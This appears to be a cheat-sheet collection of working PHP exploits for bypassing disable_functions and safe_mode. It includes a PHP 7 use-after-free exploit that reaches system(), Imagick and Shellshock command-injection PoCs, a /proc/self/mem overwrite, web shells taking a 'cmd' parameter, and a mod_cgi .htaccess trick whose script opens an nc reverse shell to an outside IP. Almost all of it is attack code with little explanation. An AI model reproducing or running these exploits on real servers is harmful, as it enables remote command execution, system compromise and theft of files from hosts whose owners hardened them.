disable_functions bypass - PHP 7.0-7.4 (*nix only)
PHP 7.0-7.4 (*nix only)

From https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php​

<?php
​
# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)
#
# Bug: https://bugs.php.net/bug.php?id=76047
# debug_backtrace() returns a reference to a variable 
# that has been destroyed, causing a UAF vulnerability.
#
# This exploit should work on all PHP 7.0-7.4 versions
# released as of 30/01/2020.
#
# Author: https://github.com/mm0r1
​
pwn("uname -a");
​
function pwn($cmd) {
    global $abc, $helper, $backtrace;
​
    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace(); # ;)
            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4
                $backtrace = debug_backtrace();
            }
        }
    }
​
    class Helper {
        public $a, $b, $c, $d;
    }
​
    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }
​
    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }
​
    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }
​
    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }
​
    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);
​
        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);
​
        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);
​
            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }
​
        if(!$data_addr || !$text_size || !$data_size)
            return false;
​
        return [$data_addr, $text_size, $data_size];
    }
​
    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;
​
            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;
​
            return $data_addr + $i * 8;
        }
    }
​
    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }
​
    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);
​
            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }
​
    function trigger_uaf($arg) {
        # str_shuffle prevents opcache string interning
        $arg = str_shuffle(str_repeat('A', 79));
        $vuln = new Vuln();
        $vuln->a = $arg;
    }
​
    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }
​
    $n_alloc = 10; # increase this value if UAF fails
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle(str_repeat('A', 79));
​
    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];
​
    $helper = new Helper;
    $helper->b = function ($x) { };
​
    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }
​
    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;
​
    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);
​
    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);
​
    $closure_obj = str2ptr($abc, 0x20);
​
    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }
​
    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }
​
    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }
​
    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }
​
    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }
​
    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
​
    ($helper->b)($cmd);
    exit();
}
​
disable_functions bypass - Imagick <= 3.3.0 PHP >= 5.4 Exploit
Imagick <= 3.3.0 PHP >= 5.4 Exploit

From http://blog.safebuff.com/2016/05/06/disable-functions-bypass/​

# Exploit Title: PHP Imagick disable_functions Bypass
# Date: 2016-05-04
# Exploit Author: RicterZ (ricter@chaitin.com)
# Vendor Homepage: https://pecl.php.net/package/imagick
# Version: Imagick  <= 3.3.0 PHP >= 5.4
# Test on: Ubuntu 12.04
# Exploit:
<?php
# PHP Imagick disable_functions Bypass
# Author: Ricter <ricter@chaitin.com>
#
# $ curl "127.0.0.1:8080/exploit.php?cmd=cat%20/etc/passwd"
# <pre>
# Disable functions: exec,passthru,shell_exec,system,popen
# Run command: cat /etc/passwd
# ====================
# root:x:0:0:root:/root:/usr/local/bin/fish
# daemon:x:1:1:daemon:/usr/sbin:/bin/sh
# bin:x:2:2:bin:/bin:/bin/sh
# sys:x:3:3:sys:/dev:/bin/sh
# sync:x:4:65534:sync:/bin:/bin/sync
# games:x:5:60:games:/usr/games:/bin/sh
# ...
# </pre>
echo "Disable functions: " . ini_get("disable_functions") . "\n";
$command = isset($_GET['cmd']) ? $_GET['cmd'] : 'id';
echo "Run command: $command\n====================\n";
 
$data_file = tempnam('/tmp', 'img');
$imagick_file = tempnam('/tmp', 'img');
 
$exploit = <<<EOF
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/image.jpg"|$command>$data_file")'
pop graphic-context
EOF;
 
file_put_contents("$imagick_file", $exploit);
$thumb = new Imagick();
$thumb->readImage("$imagick_file");
$thumb->writeImage(tempnam('/tmp', 'img'));
$thumb->clear();
$thumb->destroy();
 
echo file_get_contents($data_file);
?>

disable_functions - PHP 5.x Shellshock Exploit
PHP 5.x Shellshock Exploit

From http://blog.safebuff.com/2016/05/06/disable-functions-bypass/​

<?php
​
echo "Disabled functions: ".ini_get('disable_functions')."\n";
function shellshock($cmd) { // Execute a command via CVE-2014-6271 @ mail.c:283
   if(strstr(readlink("/bin/sh"), "bash") != FALSE) {
     $tmp = tempnam(".","data");
     putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1");
     // In Safe Mode, the user may only alter environment variables whose names
     // begin with the prefixes supplied by this directive.
     // By default, users will only be able to set environment variables that
     // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive is empty,
     // PHP will let the user modify ANY environment variable!
     mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actually send any mail
   }
   else return "Not vuln (not bash)";
   $output = @file_get_contents($tmp);
   @unlink($tmp);
   if($output != "") return $output;
   else return "No output, or not vuln.";
}
echo shellshock($_REQUEST["cmd"]);
?>

disable_functions - PHP 5.2.4 ionCube extension Exploit
PHP 5.2.4 ionCube extension Exploit

<?php
//PHP 5.2.4 ionCube extension safe_mode and disable_functions protections bypass
 
//author: shinnai
//mail: shinnai[at]autistici[dot]org
//site: http://shinnai.altervista.org
 
//Tested on xp Pro sp2 full patched, worked both from the cli and on apache
 
//Technical details:
//ionCube version: 6.5
//extension: ioncube_loader_win_5.2.dll (other may also be vulnerable)
//url: www.ioncube.com
 
//php.ini settings:
//safe_mode = On
//disable_functions = ioncube_read_file, readfile
 
//Description:
//This is useful to obtain juicy informations but also to retrieve source
//code of php pages, password files, etc... you just need to change file path.
//Anyway, don't worry, nobody will read your obfuscated code :)
 
//greetz to: BlackLight for help me to understand better PHP
 
//P.S.
//This extension contains even an interesting ioncube_write_file function...
if (!extension_loaded("ionCube Loader")) die("ionCube Loader extension required!");
$path = str_repeat("..\\", 20);
$MyBoot_readfile = readfile($path."windows\\system.ini"); #just to be sure that I set correctely disable_function :)
$MyBoot_ioncube = ioncube_read_file($path."boot.ini");
echo $MyBoot_readfile;
echo "<br><br>ionCube output:<br><br>";
echo $MyBoot_ioncube;
?>

disable_functions bypass - PHP <= 5.2.9 on windows
PHP <= 5.2.9 on windows

From http://blog.safebuff.com/2016/05/06/disable-functions-bypass/​
exploit.php
cmd.bat

<?php
//cmd.php
/*
	Abysssec Inc Public Advisory 
	
	Here is another safemod bypass vulnerability exist in php <= 5.2.9 on windows .
	the problem comes from OS behavior - implement  and interfacing between php
	and operation systems directory structure . the problem is php won't tell difference 
	between directory browsing in linux and windows this can lead attacker to ability 
	execute his / her commands on targert machie even in SafeMod On  (php.ini setting) . 
	=============================================================================
	in linux when you want open a directory for example php directory you need
	to go to /usr/bin/php and you can't use \usr\bin\php . but windows won't tell
	diffence between slash and back slash it means there is no didffrence  between 
	c:\php and c:/php , and this is not vulnerability but itself but  because of this  simple 
	php implement "\" character can escape safemode using  function like excec . 
	here is a PoC for discussed vulnerability . just upload files on your target host and execute
	your commands . 
	==============================================================================
	note : this vulnerabities is just for educational purpose and author will be not be responsible  
	for any damage using this vulnerabilty. 
	==============================================================================
	for more information visit Abysssec.com
	feel free to contact me at admin [at] abysssec.com
*/
	$cmd = $_REQUEST['cmd'];
	if ($cmd){
	$batch = fopen ("cmd.bat","w");
	fwrite($batch,"$cmd>abysssec.txt"."\r\n");
	fwrite($batch,"exit");
	fclose($batch);
	exec("\start cmd.bat");
	echo "<center>";
	echo "<h1>Abysssec.com PHP <= 5.2.9 SafeMod Bypasser</h1>";
	echo "<textarea rows=20 cols=60>";
	require("abysssec.txt");
	echo "</textarea>";
	echo "</center>";
	}
?>
​
<html>
<body bgcolor=#000000 and text=#DO0000>
<center>
<form method=post>
<input type=text name=cmd >
<input type=submit value=bypass>
</form>
</center>
</body>
</html>

disable_functions bypass - PHP 5.2.4 and 5.2.5 PHP cURL
PHP 5.2.4 and 5.2.5 PHP cURL

From http://blog.safebuff.com/2016/05/06/disable-functions-bypass/​

source: http://www.securityfocus.com/bid/27413/info
 
PHP cURL is prone to a 'safe mode' security-bypass vulnerability.
 
Attackers can use this issue to gain access to restricted files, potentially obtaining sensitive information that may aid in further attacks.
 
The issue affects PHP 5.2.5 and 5.2.4. 
 
var_dump(curl_exec(curl_init("file://safe_mode_bypass\x00&quot;.__FILE__)));

disable_functions bypass - PHP Perl Extension Safe_mode Bypass Exploit
PHP Perl Extension Safe_mode Bypass Exploit

From http://blog.safebuff.com/2016/05/06/disable-functions-bypass/​

<?php
 
##########################################################
###----------------------------------------------------###
###----PHP Perl Extension Safe_mode Bypass Exploit-----###
###----------------------------------------------------###
###-Author:--NetJackal---------------------------------###
###-Email:---nima_501[at]yahoo[dot]com-----------------###
###-Website:-http://netjackal.by.ru--------------------###
###----------------------------------------------------###
##########################################################
 
if(!extension_loaded('perl'))die('perl extension is not loaded');
if(!isset($_GET))$_GET=&$HTTP_GET_VARS;
if(empty($_GET['cmd']))$_GET['cmd']=(strtoupper(substr(PHP_OS,0,3))=='WIN')?'dir':'ls';
$perl=new perl();
echo "<textarea rows='25' cols='75'>";
$perl->eval("system('".$_GET['cmd']."')");
echo "&lt;/textarea&gt;";
$_GET['cmd']=htmlspecialchars($_GET['cmd']);
echo "<br><form>CMD: <input type=text name=cmd value='".$_GET['cmd']."' size=25></form>"
 
?>

disable_functions bypass - PHP 5.2.3 - Win32std ext Protections Bypass
PHP 5.2.3 - Win32std ext Protections Bypass

From http://blog.safebuff.com/2016/05/06/disable-functions-bypass/​

<?php
//PHP 5.2.3 win32std extension safe_mode and disable_functions protections bypass
​
//author: shinnai
//mail: shinnai[at]autistici[dot]org
//site: http://shinnai.altervista.org
​
//Tested on xp Pro sp2 full patched, worked both from the cli and on apache
​
//Thanks to rgod for all his precious advises :)
​
//I set php.ini in this way:
//safe_mode = On
//disable_functions = system
//if you launch the exploit from the cli, cmd.exe will be wxecuted
//if you browse it through apache, you'll see a new cmd.exe process activated in taskmanager
​
if (!extension_loaded("win32std")) die("win32std extension required!");
system("cmd.exe"); //just to be sure that protections work well
win_shell_execute("..\\..\\..\\..\\windows\\system32\\cmd.exe");
?>

disable_functions bypass - PHP 5.2 - FOpen Exploit
PHP 5.2 - FOpen Exploit

From http://blog.safebuff.com/2016/05/06/disable-functions-bypass/​

php -r 'fopen("srpath://../../../../../../../dir/pliczek", "a");'


disable_functions bypass - via mem
via mem

From http://blog.safebuff.com/2016/05/06/disable-functions-bypass/​

<?php
/*
1. kernel>=2.68
2）PHP-CGI or PHP-FPM）因为mod_php并没有读取/proc/self/mem
3）代码针对x64编写，要用于x32需要更改
4）Open_basedir=off（或者能绕过open_basedir读写 /lib/ 和/proc/）
*/
/*
$libc_ver:
beched@linuxoid ~ $ php -r 'readfile("/proc/self/maps");' | grep libc
7f3dfa609000-7f3dfa7c4000 r-xp 00000000 08:01 9831386                    /lib/x86_64-linux-gnu/libc-2.19.so
$open_php:
beched@linuxoid ~ $ objdump -R /usr/bin/php | grep '\sopen$'
0000000000e94998 R_X86_64_JUMP_SLOT  open
$system_offset and $open_offset:
beched@linuxoid ~ $ readelf -s /lib/x86_64-linux-gnu/libc-2.19.so | egrep "\s(system|open)@@"
  1337: 0000000000046530    45 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.2.5
  1679: 00000000000ec150    90 FUNC    WEAK   DEFAULT   12 open@@GLIBC_2.2.5
*/
function packlli($value) {
    $higher = ($value & 0xffffffff00000000) >> 32;
    $lower = $value & 0x00000000ffffffff;
    return pack('V2', $lower, $higher);
}
function unp($value) {
    return hexdec(bin2hex(strrev($value)));
}
function parseelf($bin_ver, $rela = false) {
    $bin = file_get_contents($bin_ver);
    $e_shoff = unp(substr($bin, 0x28, 8));
    $e_shentsize = unp(substr($bin, 0x3a, 2));
    $e_shnum = unp(substr($bin, 0x3c, 2));
    $e_shstrndx = unp(substr($bin, 0x3e, 2));
    for($i = 0; $i < $e_shnum; $i += 1) {
        $sh_type = unp(substr($bin, $e_shoff + $i * $e_shentsize + 4, 4));
        if($sh_type == 11) { // SHT_DYNSYM
            $dynsym_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
            $dynsym_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
            $dynsym_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8));
        }
        elseif(!isset($strtab_off) && $sh_type == 3) { // SHT_STRTAB
            $strtab_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
            $strtab_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
        }
        elseif($rela && $sh_type == 4) { // SHT_RELA
            $relaplt_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
            $relaplt_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
            $relaplt_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8));
        }
    }
    if($rela) {
        for($i = $relaplt_off; $i < $relaplt_off + $relaplt_size; $i += $relaplt_entsize) {
            $r_offset = unp(substr($bin, $i, 8));
            $r_info = unp(substr($bin, $i + 8, 8)) >> 32;
            $name_off = unp(substr($bin, $dynsym_off + $r_info * $dynsym_entsize, 4));
            $name = '';
            $j = $strtab_off + $name_off - 1;
            while($bin[++$j] != "\0") {
                $name .= $bin[$j];
            }
            if($name == 'open') {
                return $r_offset;
            }
        }
    }
    else {
        for($i = $dynsym_off; $i < $dynsym_off + $dynsym_size; $i += $dynsym_entsize) {
            $name_off = unp(substr($bin, $i, 4));
            $name = '';
            $j = $strtab_off + $name_off - 1;
            while($bin[++$j] != "\0") {
                $name .= $bin[$j];
            }
            if($name == '__libc_system') {
                $system_offset = unp(substr($bin, $i + 8, 8));
            }
            if($name == '__open') {
                $open_offset = unp(substr($bin, $i + 8, 8));
            }
        }
        return array($system_offset, $open_offset);
    }
}
echo "[*] PHP disable_functions procfs bypass (coded by Beched, RDot.Org)\n";
if(strpos(php_uname('a'), 'x86_64') === false) {
    echo "[-] This exploit is for x64 Linux. Exiting\n";
    exit;
}
if(substr(php_uname('r'), 0, 4) < 2.98) {
    echo "[-] Too old kernel (< 2.98). Might not work\n";
}
echo "[*] Trying to get open@plt offset in PHP binary\n";
$open_php = parseelf('/proc/self/exe', true);
if($open_php == 0) {
    echo "[-] Failed. Exiting\n";
    exit;
}
echo '[+] Offset is 0x' . dechex($open_php) . "\n";
$maps = file_get_contents('/proc/self/maps');
preg_match('#\s+(/.+libc\-.+)#', $maps, $r);
echo "[*] Libc location: $r[1]\n";
echo "[*] Trying to get open and system symbols from Libc\n";
list($system_offset, $open_offset) = parseelf($r[1]);
if($system_offset == 0 or $open_offset == 0) {
    echo "[-] Failed. Exiting\n";
    exit;
}
echo "[+] Got them. Seeking for address in memory\n";
$mem = fopen('/proc/self/mem', 'rb');
fseek($mem, $open_php);
$open_addr = unp(fread($mem, 8));
echo '[*] open@plt addr: 0x' . dechex($open_addr) . "\n";
$libc_start = $open_addr - $open_offset;
$system_addr = $libc_start + $system_offset;
echo '[*] system@plt addr: 0x' . dechex($system_addr) . "\n";
echo "[*] Rewriting open@plt address\n";
$mem = fopen('/proc/self/mem', 'wb');
fseek($mem, $open_php);
if(fwrite($mem, packlli($system_addr))) {
    echo "[+] Address written. Executing cmd\n";
    readfile('/usr/bin/id');
    exit;
}
echo "[-] Write failed. Exiting\n";


disable_functions bypass - mod_cgi
mod_cgi

From http://blog.safebuff.com/2016/05/06/disable-functions-bypass/​

<?php
// Only working with mod_cgi, writable dir and htaccess files enabled
$cmd = "nc -c '/bin/bash' 172.16.15.1 4444"; //command to be executed
$shellfile = "#!/bin/bash\n"; //using a shellscript
$shellfile .= "echo -ne \"Content-Type: text/html\\n\\n\"\n"; //header is needed, otherwise a 500 error is thrown when there is output
$shellfile .= "$cmd"; //executing $cmd
function checkEnabled($text,$condition,$yes,$no) //this surely can be shorter
{
	echo "$text: " . ($condition ? $yes : $no) . "<br>\n";
}
if (!isset($_GET['checked']))
{
	@file_put_contents('.htaccess', "\nSetEnv HTACCESS on", FILE_APPEND); //Append it to a .htaccess file to see whether .htaccess is allowed
	header('Location: ' . $_SERVER['PHP_SELF'] . '?checked=true'); //execute the script again to see if the htaccess test worked
}
else
{
	$modcgi = in_array('mod_cgi', apache_get_modules()); // mod_cgi enabled?
	$writable = is_writable('.'); //current dir writable?
	$htaccess = !empty($_SERVER['HTACCESS']); //htaccess enabled?
		checkEnabled("Mod-Cgi enabled",$modcgi,"Yes","No");
		checkEnabled("Is writable",$writable,"Yes","No");
		checkEnabled("htaccess working",$htaccess,"Yes","No");
	if(!($modcgi && $writable && $htaccess))
	{
		echo "Error. All of the above must be true for the script to work!"; //abort if not
	}
	else
	{
		checkEnabled("Backing up .htaccess",copy(".htaccess",".htaccess.bak"),"Suceeded! Saved in .htaccess.bak","Failed!"); //make a backup, cause you never know.
		checkEnabled("Write .htaccess file",file_put_contents('.htaccess',"Options +ExecCGI\nAddHandler cgi-script .dizzle"),"Succeeded!","Failed!"); //.dizzle is a nice extension
		checkEnabled("Write shell file",file_put_contents('shell.dizzle',$shellfile),"Succeeded!","Failed!"); //write the file
		checkEnabled("Chmod 777",chmod("shell.dizzle",0777),"Succeeded!","Failed!"); //rwx
		echo "Executing the script now. Check your listener <img src = 'shell.dizzle' style = 'display:none;'>"; //call the script
	}
}
?>

disable_functions bypass - PHP 4 >= 4.2.0, PHP 5 pcntl_exec
PHP 4 >= 4.2.0, PHP 5 pcntl_exec

From http://blog.safebuff.com/2016/05/06/disable-functions-bypass/​

<?php
$dir = '/var/tmp/';
$cmd = 'ls';
$option = '-l';
$pathtobin = '/bin/bash';
 
$arg = array($cmd, $option, $dir);
 
pcntl_exec($pathtobin, $arg);
echo '123';
?>
<?php
$cmd = @$_REQUEST[cmd];
if(function_exists('pcntl_exec')) {
    $cmd = $cmd."&pkill -9 bash >out";
    pcntl_exec("/bin/bash", $cmd);
    echo file_get_contents("out");        
} else {
        echo '不支持pcntl扩展';
}
?>

